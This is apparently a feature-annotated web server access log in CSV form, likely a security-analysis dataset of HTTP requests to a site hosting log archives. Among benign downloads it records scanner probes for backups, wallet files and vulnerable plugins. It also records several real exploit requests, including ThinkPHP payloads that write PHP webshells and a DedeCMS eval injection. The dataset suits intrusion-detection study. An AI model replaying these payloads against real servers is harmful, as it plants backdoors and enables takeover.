41,1,404,328,7,14,2,2,0,GET /google30776e34d2e57a82.html HTTP/1.1
48,1,200,22122,7,19,7,3,0,GET /self.logs/access.log.2021-05-25.gz HTTP/1.1
48,1,200,36595,7,19,7,3,0,GET /self.logs/access.log.2021-05-26.gz HTTP/1.1
48,1,200,27869,7,19,7,3,0,GET /self.logs/access.log.2021-05-27.gz HTTP/1.1
48,1,200,17173,7,19,7,3,0,GET /self.logs/access.log.2021-05-28.gz HTTP/1.1
48,1,200,17628,7,19,7,3,0,GET /self.logs/access.log.2021-05-29.gz HTTP/1.1
103,1,404,291,7,76,9,7,0,GET /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=upload.php HTTP/1.1
60,1,206,343560,11,34,5,4,1,GET /Security-Data-Analysis/Lab_2/honeypot.json.zip HTTP/1.1
85,3,200,48064,7,42,7,2,0,GET /?utm_source=wechat_session&utm_medium=social&utm_oi=1086599599250194432 HTTP/1.1
27,1,404,328,7,12,2,2,0,GET /server-status HTTP/1.1
66,1,404,284,7,46,2,7,0,GET /js/fckeditor/editor/filemanager/connectors/test.html HTTP/1.1
63,1,404,284,7,44,2,6,0,GET /fckeditor/editor/filemanager/connectors/test.html HTTP/1.1
63,1,404,284,10,41,2,6,0,GET /FCKeditor/editor/filemanager/connectors/test.html HTTP/1.1
69,1,404,284,7,49,2,7,0,GET /admin/fckeditor/editor/filemanager/connectors/test.html HTTP/1.1
22,1,404,328,7,7,2,2,0,GET /info.php HTTP/1.1
25,1,404,328,7,10,2,2,0,GET /phpinfo.php HTTP/1.1
21,1,418,747,7,6,2,2,0,GET /php.ini HTTP/1.1
31,1,404,328,7,15,1,3,0,GET /_profiler/phpinfo HTTP/1.1
28,1,404,328,7,12,2,3,0,GET /xampp/info.php HTTP/1.1
31,1,404,328,7,15,2,3,0,GET /xampp/phpinfo.php HTTP/1.1
45,1,404,328,7,27,3,4,0,GET /debug/default/view?panel=config HTTP/1.1
44,1,200,307,7,16,6,3,0,GET /self.logs/error.log.2021-05-28 HTTP/1.1
106,1,404,328,28,39,13,5,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf/RK=2/RS=DCp4cZdaH2j.ST8E1uUM2YWfA7c- HTTP/1.1
34,1,200,615642,7,16,4,3,0,GET /auth.log/auth.log.gz HTTP/1.0
64,1,200,387,14,36,3,4,0,HEAD /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1
30,1,404,265,8,13,2,2,0,HEAD /full_backup.zip HTTP/1.1
34,1,404,265,8,16,2,3,0,HEAD /bak/full_backup.zip HTTP/1.1
38,1,404,265,8,20,2,3,0,HEAD /restore/full_backup.zip HTTP/1.1
34,1,404,265,8,16,2,3,0,HEAD /old/full_backup.zip HTTP/1.1
37,1,404,265,8,19,2,3,0,HEAD /backup/full_backup.zip HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /restore/bak.gz HTTP/1.1
38,1,404,265,8,20,2,3,0,HEAD /backups/full_backup.zip HTTP/1.1
35,1,404,265,8,17,2,3,0,HEAD /back/full_backup.zip HTTP/1.1
47,1,200,1772,7,18,7,3,0,GET /self.logs/error.log.2019-11-24.gz HTTP/1.1
57,1,200,746,16,23,6,4,1,GET /Datasets%20Description/Network/?C=S%3BO%3DA HTTP/1.1
53,1,200,14363,7,19,7,4,0,GET /self.logs/2015/access.log.2015-10-19.gz HTTP/1.1
24,1,404,291,7,4,1,4,0,GET /1111/feed/ HTTP/1.1
18,1,404,291,7,3,1,3,0,GET /rss/ HTTP/1.1
94,2,404,291,7,68,8,3,0,GET /wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin HTTP/1.1
34,1,404,284,7,8,5,2,0,GET /error.log.2021-05-28 HTTP/1.1
40,1,200,395,8,22,2,4,0,HEAD /bootstrap/img/favicon.ico HTTP/1.1
47,1,404,328,9,26,3,5,0,GET /administrator/help/en-GB/toc.json HTTP/1.1
54,1,404,328,9,33,3,5,0,GET /administrator/language/en-GB/install.xml HTTP/1.1
44,1,404,328,7,26,2,5,0,GET /plugins/system/debug/debug.xml HTTP/1.1
26,1,404,328,7,10,2,3,0,GET /misc/ajax.js HTTP/1.1
39,1,404,328,7,22,2,4,0,GET /admin/includes/general.js HTTP/1.1
41,1,404,328,7,24,2,4,0,GET /images/editor/separator.gif HTTP/1.1
37,1,404,328,7,16,4,3,0,GET /js/header-rollup-554.js HTTP/1.1
46,1,404,328,7,28,2,5,0,GET /vendor/phpunit/phpunit/build.xml HTTP/1.1
79,1,404,328,9,55,4,7,0,GET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media HTTP/1.1
46,1,404,328,7,25,6,3,0,GET /wp-admin/setup-config.php?step=0 HTTP/1.1
56,1,404,328,7,34,6,4,0,GET /wordpress/wp-admin/setup-config.php?step=0 HTTP/1.1
49,1,404,328,7,27,6,4,0,GET /wp/wp-admin/setup-config.php?step=0 HTTP/1.1
51,1,404,328,7,29,6,4,0,GET /blog/wp-admin/setup-config.php?step=0 HTTP/1.1
51,1,404,328,7,29,6,4,0,GET /test/wp-admin/setup-config.php?step=0 HTTP/1.1
51,1,404,328,7,29,6,4,0,GET /site/wp-admin/setup-config.php?step=0 HTTP/1.1
29,1,301,504,7,13,2,3,0,GET /blog/robots.txt HTTP/1.1
21,1,404,328,7,6,1,3,0,GET /backup/ HTTP/1.1
19,1,404,328,7,4,1,3,0,GET /temp/ HTTP/1.1
27,1,404,291,16,3,2,2,0,GET /CHANGELOG.txt HTTP/1.1
25,1,404,305,7,10,2,2,0,GET /license.txt HTTP/1.1
24,1,404,305,13,3,2,2,0,GET /README.txt HTTP/1.1
18,1,404,328,8,3,1,2,0,GET /Mike HTTP/1.1
47,1,200,4632,7,18,7,3,0,GET /self.logs/error.log.2018-09-24.gz HTTP/1.1
23,1,200,1192,7,8,1,3,1,GET /honeypot/ HTTP/1.0
25,1,301,495,7,9,2,3,0,GET //semalt.com HTTP/1.1
25,1,404,284,7,10,2,2,0,GET /content.php HTTP/1.1
24,1,404,328,7,9,2,2,0,GET /semalt.com HTTP/1.1
24,1,301,458,7,9,2,2,0,GET /humans.txt HTTP/1.1
48,1,200,21667,7,19,7,3,0,GET /self.logs/access.log.2021-05-30.gz HTTP/1.1
48,1,200,23686,7,19,7,3,0,GET /self.logs/access.log.2021-05-31.gz HTTP/1.1
48,1,200,17060,7,19,7,3,0,GET /self.logs/access.log.2021-06-01.gz HTTP/1.1
48,1,200,19029,7,19,7,3,0,GET /self.logs/access.log.2021-06-02.gz HTTP/1.1
48,1,200,19746,7,19,7,3,0,GET /self.logs/access.log.2021-06-03.gz HTTP/1.1
48,1,200,27341,7,19,7,3,0,GET /self.logs/access.log.2021-06-04.gz HTTP/1.1
32,1,404,309,8,15,2,3,0,HEAD /database/doc.html HTTP/1.1
32,1,404,309,8,14,3,3,0,HEAD /bf-admin/doc.html HTTP/1.1
32,1,404,309,8,14,2,3,0,HEAD /bak_data/doc.html HTTP/1.1
37,1,404,309,8,19,2,4,0,HEAD /e/update/resetuser.php HTTP/1.1
38,1,404,309,8,19,2,4,0,HEAD /e/update/resetuser1.php HTTP/1.1
34,1,404,309,8,17,2,3,0,HEAD /beifenwang/doc.html HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /dg/doc.html HTTP/1.1
28,1,404,265,8,11,2,3,0,HEAD /data/doc.html HTTP/1.1
36,1,404,265,9,17,3,3,1,HEAD /Mysql-manage/doc.html HTTP/1.1
32,1,404,265,8,15,2,3,1,HEAD /mysqlbak/doc.html HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /wgw/doc.html HTTP/1.1
31,1,404,265,8,14,2,3,0,HEAD /databak/doc.html HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /bei/doc.html HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /bf/doc.html HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /bak/doc.html HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /diguo/doc.html HTTP/1.1
28,1,404,265,8,11,2,3,0,HEAD /dgbf/doc.html HTTP/1.1
31,1,404,265,8,14,2,3,0,HEAD /awdiguo/doc.html HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /dgg/doc.html HTTP/1.1
31,1,404,265,8,14,2,3,1,HEAD /backsql/doc.html HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /ebf/doc.html HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /dbbak/doc.html HTTP/1.1
29,1,404,265,8,12,2,3,1,HEAD /mysql/doc.html HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /beifen/doc.html HTTP/1.1
37,1,404,265,8,18,2,3,0,HEAD /bak_adminn_cn/doc.html HTTP/1.1
35,1,404,265,8,18,2,3,0,HEAD /shujukudata/doc.html HTTP/1.1
36,1,404,265,8,15,2,3,0,HEAD /bak_admin_99/doc.html HTTP/1.1
28,1,404,265,8,11,2,3,0,HEAD /ebak/doc.html HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /dgbak/doc.html HTTP/1.1
33,1,404,265,10,14,2,3,0,HEAD /EmpireBak/doc.html HTTP/1.1
48,1,200,13695,7,19,7,3,0,GET /self.logs/access.log.2019-12-14.gz HTTP/1.1
48,1,200,20746,7,19,7,3,0,GET /self.logs/access.log.2018-05-07.gz HTTP/1.1
53,1,200,3370,7,19,7,4,0,GET /self.logs/2015/access.log.2015-02-02.gz HTTP/1.1
41,1,200,7621,13,8,6,4,1,GET /self.logs/2015/?C=S%3BO%3DA HTTP/1.1
52,1,200,710,7,18,7,4,0,GET /self.logs/2015/error.log.2015-06-03.gz HTTP/1.1
52,1,200,922,7,18,7,4,0,GET /self.logs/2015/error.log.2015-07-10.gz HTTP/1.1
52,1,200,880,7,18,7,4,0,GET /self.logs/2015/error.log.2015-09-06.gz HTTP/1.1
32,1,404,328,7,10,4,3,0,GET /js/common.js%20%20 HTTP/1.1
52,1,200,778,7,18,7,4,0,GET /self.logs/2015/error.log.2015-07-17.gz HTTP/1.1
47,1,200,2534,7,18,7,3,0,GET /self.logs/error.log.2017-09-21.gz HTTP/1.1
47,1,200,1326,7,18,7,3,0,GET /self.logs/error.log.2021-06-01.gz HTTP/1.1
47,1,200,8731,7,18,7,3,0,GET /self.logs/error.log.2021-05-30.gz HTTP/1.1
48,1,200,10539,7,19,7,3,0,GET /self.logs/access.log.2017-03-18.gz HTTP/1.1
52,1,200,850,7,18,7,4,0,GET /self.logs/2016/error.log.2016-11-24.gz HTTP/1.1
44,1,200,307,7,16,6,3,0,GET /self.logs/error.log.2021-05-31 HTTP/1.1
53,1,200,6133,7,19,7,4,0,GET /self.logs/2016/access.log.2016-10-01.gz HTTP/1.1
46,1,404,328,9,21,5,3,1,GET /honeypot/Honeypot%20-%20Howto.pd HTTP/1.1
53,1,200,4037,7,19,7,4,0,GET /self.logs/2015/access.log.2015-07-15.gz HTTP/1.1
53,1,200,7174,7,19,7,4,0,GET /self.logs/2015/access.log.2015-12-11.gz HTTP/1.1
52,1,200,945,7,18,7,4,0,GET /self.logs/2015/error.log.2015-09-23.gz HTTP/1.1
53,1,200,5006,7,19,7,4,0,GET /self.logs/2015/access.log.2015-03-24.gz HTTP/1.1
52,1,200,890,7,18,7,4,0,GET /self.logs/2015/error.log.2015-12-30.gz HTTP/1.1
52,1,200,817,7,18,7,4,0,GET /self.logs/2015/error.log.2015-11-09.gz HTTP/1.1
52,1,200,620,7,18,7,4,0,GET /self.logs/2015/error.log.2015-11-23.gz HTTP/1.1
53,1,200,7661,7,19,7,4,0,GET /self.logs/2015/access.log.2015-11-10.gz HTTP/1.1
53,1,200,39517,7,19,7,4,0,GET /self.logs/2016/access.log.2016-12-06.gz HTTP/1.1
80,1,404,291,8,59,2,6,0,GET /administrator/components/com_simplephotogallery/lib/uploadFile.php HTTP/1.1
53,1,200,6236,7,19,7,4,0,GET /self.logs/2015/access.log.2015-06-12.gz HTTP/1.1
83,1,200,12883,32,29,4,2,0,GET /?fbclid=IwAR0eMOx5_fVGFL8ujAjpmJP_G0CZwiiOA0_E6VKojprzyX6YoSuH9pxrZ-4 HTTP/1.1
53,1,200,10881,7,19,7,4,0,GET /self.logs/2016/access.log.2016-02-27.gz HTTP/1.1
53,1,200,17546,7,19,7,4,0,GET /self.logs/2016/access.log.2016-08-11.gz HTTP/1.1
53,1,200,15822,7,19,7,4,0,GET /self.logs/2016/access.log.2016-10-19.gz HTTP/1.1
53,1,200,12814,7,19,7,4,0,GET /self.logs/2016/access.log.2016-03-18.gz HTTP/1.1
53,1,200,8267,7,19,7,4,0,GET /self.logs/2016/access.log.2016-11-06.gz HTTP/1.1
72,1,404,328,9,50,4,5,0,GET /wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd HTTP/1.1
77,1,404,328,9,54,4,6,0,GET /blog/wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd HTTP/1.1
75,1,404,328,9,52,4,6,0,GET /wp/wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd HTTP/1.1
82,1,404,328,9,59,4,6,0,GET /wordpress/wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd HTTP/1.1
65,1,404,328,9,43,4,5,0,GET /wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1
70,1,404,328,9,47,4,6,0,GET /blog/wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1
68,1,404,328,9,45,4,6,0,GET /wp/wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1
75,1,404,328,9,52,4,6,0,GET /wordpress/wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1
71,1,404,328,9,49,4,5,0,GET /wp-content/plugins/ioptimization/IOptimizes.php?hamlorszd HTTP/1.1
76,1,404,328,9,53,4,6,0,GET /blog/wp-content/plugins/ioptimization/IOptimizes.php?hamlorszd HTTP/1.1
74,1,404,328,9,51,4,6,0,GET /wp/wp-content/plugins/ioptimization/IOptimizes.php?hamlorszd HTTP/1.1
81,1,404,328,9,58,4,6,0,GET /wordpress/wp-content/plugins/ioptimization/IOptimizes.php?hamlorszd HTTP/1.1
53,1,200,12459,7,19,7,4,0,GET /self.logs/2016/access.log.2016-10-12.gz HTTP/1.1
48,1,200,28998,7,19,7,3,0,GET /self.logs/access.log.2021-06-05.gz HTTP/1.1
48,1,200,22674,7,19,7,3,0,GET /self.logs/access.log.2021-06-06.gz HTTP/1.1
48,1,200,20730,7,19,7,3,0,GET /self.logs/access.log.2021-06-07.gz HTTP/1.1
48,1,200,19257,7,19,7,3,0,GET /self.logs/access.log.2021-06-08.gz HTTP/1.1
59,1,404,328,7,38,3,7,0,GET /assets/plugins/jquery-file-upload/server/php/ HTTP/1.1
59,1,404,328,10,35,3,7,0,GET /assets/plugins/jQuery-File-Upload/server/php/ HTTP/1.1
66,1,404,328,7,44,3,8,0,GET /assets/global/plugins/jquery-file-upload/server/php/ HTTP/1.1
65,1,404,328,7,43,3,8,0,GET /admin/assets/plugins/jquery-file-upload/server/php/ HTTP/1.1
65,1,404,328,10,40,3,8,0,GET /admin/assets/plugins/jQuery-File-Upload/server/php/ HTTP/1.1
58,1,404,328,7,38,2,7,0,GET /assets/plugins/jquery-fileupload/server/php/ HTTP/1.1
52,1,404,328,7,32,3,6,0,GET /plugins/jquery-file-upload/server/php/ HTTP/1.1
51,1,404,328,7,31,3,6,0,GET /assets/jquery-file-upload/server/php/ HTTP/1.1
26,1,404,328,7,11,2,2,0,GET /timthumb.php HTTP/1.1
27,1,404,328,7,11,2,2,0,GET /timthumb2.php HTTP/1.1
32,1,404,328,7,16,2,3,0,GET /admin/timthumb.php HTTP/1.1
23,1,404,328,7,8,2,2,0,GET /thumb.php HTTP/1.1
29,1,404,328,7,13,2,3,0,GET /admin/thumb.php HTTP/1.1
44,1,200,307,7,16,6,3,0,GET /self.logs/error.log.2021-06-05 HTTP/1.1
119,3,404,328,19,79,9,7,0,POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1
60,4,404,250,7,36,10,2,0,GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
58,1,404,305,12,33,2,4,0,POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1
27,1,404,305,7,11,2,3,0,GET /plus/moon.php HTTP/1.1
41,1,418,746,8,17,4,3,0,POST /plus/mytag_js.php?aid=9090 HTTP/1.1
66,2,418,746,8,37,8,4,0,POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1
50,1,418,746,8,30,3,5,0,POST /utility/convert/data/config.inc.php HTTP/1.1
131,3,418,746,18,63,24,6,1,GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1
56,1,418,746,8,35,4,4,0,POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1
46,1,404,305,9,26,2,5,0,POST /index.php/api/Uploadify/preview HTTP/1.1
32,1,404,305,7,15,4,2,0,GET /user.php?act=login HTTP/1.1
23,1,418,746,8,7,2,2,0,POST /fdgq.php HTTP/1.1
153,3,418,746,23,80,25,4,1,GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=dihlb.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1
23,1,404,305,7,8,2,2,0,GET /dihlb.php HTTP/1.1
221,5,418,746,30,111,38,5,1,GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=ootyf.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1
23,1,404,305,7,8,2,2,0,GET /ootyf.php HTTP/1.1
23,1,404,305,7,8,2,2,0,GET /index.php HTTP/1.1
51,1,404,305,7,29,2,3,0,GET /datasets%20description/html_bro_log_2 HTTP/1.1
53,1,404,305,7,33,3,4,0,GET /datasets%20description/network/dns.html HTTP/1.1
55,1,404,305,7,35,3,4,0,GET /datasets%20description/network/files.html HTTP/1.1
51,1,404,305,7,29,2,3,0,GET /datasets%20description/html_bro_log_1 HTTP/1.1
54,1,404,305,7,34,3,4,0,GET /datasets%20description/network/http.html HTTP/1.1
60,1,404,305,7,40,3,4,0,GET /datasets%20description/network/signatures.html HTTP/1.1
54,1,404,328,7,34,3,4,0,GET /datasets%20description/network/smtp.html HTTP/1.1
53,1,404,305,7,33,3,4,0,GET /datasets%20description/network/ssh.html HTTP/1.1
53,1,404,305,7,33,3,4,0,GET /datasets%20description/network/ssl.html HTTP/1.1
56,1,404,305,7,36,3,4,0,GET /datasets%20description/network/tunnel.html HTTP/1.1
55,1,404,328,7,35,3,4,0,GET /datasets%20description/network/weird.html HTTP/1.1
62,1,404,305,7,41,3,4,0,GET /datasets%20description/pe_malware/opcleaver.html HTTP/1.1
63,1,404,305,7,42,3,4,0,GET /datasets%20description/pe_malware/virusshare.html HTTP/1.1
57,1,404,328,7,36,3,4,0,GET /datasets%20description/pe_malware/zeus.html HTTP/1.1
53,1,404,305,7,33,3,4,0,GET /datasets%20description/network/ftp.html HTTP/1.1
48,1,404,328,7,28,2,5,0,GET /datasets%20description/network/n/a HTTP/1.1
53,1,404,284,13,17,7,3,1,GET /honeypot/BSidesDFW%20-%202014.ipynb'A=0 HTTP/1.1
32,1,200,29900,7,12,6,3,0,GET /self.logs/?c=n;o=d HTTP/1.1
32,1,200,29900,7,12,6,3,0,GET /self.logs/?c=s;o=a HTTP/1.1
32,1,200,29900,7,12,6,3,0,GET /self.logs/?c=d;o=a HTTP/1.1
32,1,200,29900,7,12,6,3,0,GET /self.logs/?c=m;o=a HTTP/1.1
37,1,200,7621,7,12,6,4,0,GET /self.logs/2015/?c=d;o=a HTTP/1.1
37,1,200,7621,7,12,6,4,0,GET /self.logs/2015/?c=m;o=a HTTP/1.1
37,1,200,7621,7,12,6,4,0,GET /self.logs/2015/?c=n;o=d HTTP/1.1
37,1,200,7621,7,12,6,4,0,GET /self.logs/2015/?c=s;o=a HTTP/1.1
37,1,200,7860,7,12,6,4,0,GET /self.logs/2016/?c=d;o=a HTTP/1.1
37,1,200,7860,7,12,6,4,0,GET /self.logs/2016/?c=m;o=a HTTP/1.1
37,1,200,7860,7,12,6,4,0,GET /self.logs/2016/?c=s;o=a HTTP/1.1
37,1,200,7860,7,12,6,4,0,GET /self.logs/2016/?c=n;o=d HTTP/1.1
46,1,301,538,7,28,3,4,0,GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /restore/www.tar HTTP/1.1
46,1,404,265,8,27,2,5,1,HEAD /assets/data/outgoing/backup.sql HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /back/wallet.zip HTTP/1.1
35,1,404,265,8,18,2,3,0,HEAD /backup/directory.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /backups/bak.tar HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /backup/website.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /backup/www.tar HTTP/1.1
32,1,404,265,8,15,2,3,0,HEAD /backup/backup.tar HTTP/1.1
38,1,404,265,8,20,2,3,0,HEAD /backups/public_html.tar HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /backups/wallet.zip HTTP/1.1
32,1,404,265,8,15,2,3,0,HEAD /old/directory.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /backups/www.tar HTTP/1.1
38,1,404,265,8,20,2,3,0,HEAD /restore/public_html.tar HTTP/1.1
37,1,404,265,8,19,3,3,1,HEAD /restore/backup.sql.tar HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /bak/www.tar HTTP/1.1
37,1,404,265,8,19,2,3,0,HEAD /backup/public_html.tar HTTP/1.1
33,1,404,265,8,15,3,3,1,HEAD /bak/backup.sql.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /bak/wallet.zip HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /old/www.tar HTTP/1.1
37,1,404,265,8,19,3,3,1,HEAD /backups/backup.sql.tar HTTP/1.1
34,1,404,265,8,16,3,3,1,HEAD /back/backup.sql.tar HTTP/1.1
36,1,404,265,8,19,2,3,0,HEAD /restore/directory.tar HTTP/1.1
33,1,404,265,8,15,3,3,1,HEAD /old/backup.sql.tar HTTP/1.1
34,1,404,265,8,17,2,3,0,HEAD /restore/website.tar HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /back/www.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /backup/bak.tar HTTP/1.1
34,1,404,265,8,16,2,3,0,HEAD /old/public_html.tar HTTP/1.1
32,1,301,184,8,15,2,3,0,HEAD /backup/wallet.zip HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /restore/backup.tar HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /old/bak.tar HTTP/1.1
35,1,404,265,8,17,2,3,0,HEAD /back/public_html.tar HTTP/1.1
30,1,404,265,8,13,2,2,0,HEAD /public_html.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /bak/backup.tar HTTP/1.1
32,1,404,265,8,15,2,3,0,HEAD /bak/directory.tar HTTP/1.1
26,1,404,265,8,9,2,3,0,HEAD /bak/bak.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /restore/bak.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /back/backup.tar HTTP/1.1
28,1,404,265,8,12,2,2,0,HEAD /directory.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /bak/website.tar HTTP/1.1
26,1,404,265,8,10,2,2,0,HEAD /website.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /old/backup.tar HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /backups/backup.tar HTTP/1.1
30,1,404,265,8,13,2,3,0,HEAD /old/website.tar HTTP/1.1
27,1,404,265,8,10,2,3,0,HEAD /back/bak.tar HTTP/1.1
25,1,404,265,8,9,2,2,0,HEAD /wallet.zip HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /restore/wallet.zip HTTP/1.1
33,1,404,265,8,16,2,3,0,HEAD /back/directory.tar HTTP/1.1
31,1,404,265,8,14,2,3,0,HEAD /back/website.tar HTTP/1.1
22,1,404,265,8,6,2,2,0,HEAD /bak.tar HTTP/1.1
34,1,404,265,8,17,2,3,0,HEAD /backups/website.tar HTTP/1.1
29,1,404,265,8,12,2,3,0,HEAD /old/wallet.zip HTTP/1.1
22,1,404,265,8,6,2,2,0,HEAD /www.tar HTTP/1.1
29,1,404,265,8,12,3,2,1,HEAD /backup.sql.tar HTTP/1.1
36,1,404,265,8,18,3,3,1,HEAD /backup/backup.sql.tar HTTP/1.1
36,1,404,265,8,19,2,3,0,HEAD /backups/directory.tar HTTP/1.1
47,1,200,1262,7,18,7,3,0,GET /self.logs/error.log.2021-06-08.gz HTTP/1.1
55,1,200,423,11,31,3,4,0,HEAD /Datasets%20Description/Network/dhcp.html HTTP/1.1
19,1,404,328,7,5,1,2,0,GET /login HTTP/1.1
37,1,404,328,7,20,4,2,0,GET /member.php?action=login HTTP/1.1
26,1,404,309,8,9,3,2,0,HEAD /app-ads.txt HTTP/1.1
22,1,404,309,8,6,2,2,0,HEAD /ads.txt HTTP/1.1
34,1,301,514,7,14,2,6,0,GET /wp-json/wp/v2/users/ HTTP/1.1
31,1,404,291,7,14,3,3,0,GET /blog/wp-login.php HTTP/1.1
33,1,200,823,11,6,5,3,0,GET /maccdc2012/?C=M;O=D HTTP/1.1
47,1,200,2111,7,18,7,3,0,GET /self.logs/error.log.2021-06-03.gz HTTP/1.1
48,1,200,23585,7,19,7,3,0,GET /self.logs/access.log.2021-06-09.gz HTTP/1.1
47,1,200,2780,7,18,7,3,0,GET /self.logs/error.log.2021-06-04.gz HTTP/1.1
47,1,200,1557,7,18,7,3,0,GET /self.logs/error.log.2021-06-06.gz HTTP/1.1
47,1,200,1587,7,18,7,3,0,GET /self.logs/error.log.2021-06-07.gz HTTP/1.1
47,1,200,5207,7,18,7,3,0,GET /self.logs/error.log.2021-06-09.gz HTTP/1.1
47,1,200,1149,7,18,7,3,0,GET /self.logs/error.log.2021-05-27.gz HTTP/1.1
47,1,200,965,7,18,7,3,0,GET /self.logs/error.log.2021-05-29.gz HTTP/1.1
47,1,200,2402,7,18,7,3,0,GET /self.logs/error.log.2021-06-02.gz HTTP/1.1
47,1,200,965,7,18,7,3,0,GET /self.logs/error.log.2021-05-25.gz HTTP/1.1
47,1,200,1211,7,18,7,3,0,GET /self.logs/error.log.2021-05-26.gz HTTP/1.1
59,1,404,328,7,17,10,3,0,GET /self.logs/access.log.2015-08-22:190.198.81.92 HTTP/1.1
52,1,200,790,7,18,7,4,0,GET /self.logs/2015/error.log.2015-05-25.gz HTTP/1.1
48,1,200,21482,7,19,7,3,0,GET /self.logs/access.log.2021-06-10.gz HTTP/1.1
33,1,200,826,11,6,5,3,0,GET /maccdc2012/?C=S;O=A HTTP/1.1
80,1,404,328,28,22,6,3,1,GET /honeypot/Honeypot%2B-%2BHowto.pdf=A2C1DFD001C4CB11B780AB2DF04BFEE1 HTTP/1.1
80,1,404,328,25,22,6,3,1,GET /honeypot/Honeypot%2B-%2BHowto.pdf=652C78CDABA4B0F4DAD4B610B9732D78 HTTP/1.1
102,1,404,328,33,31,10,3,1,GET /honeypot/Honeypot%2B-%2BHowto%2B-%2BBSides%2BAustin.pdf=46DAD3F061D1B4F780702EBBCFDE24FB HTTP/1.1
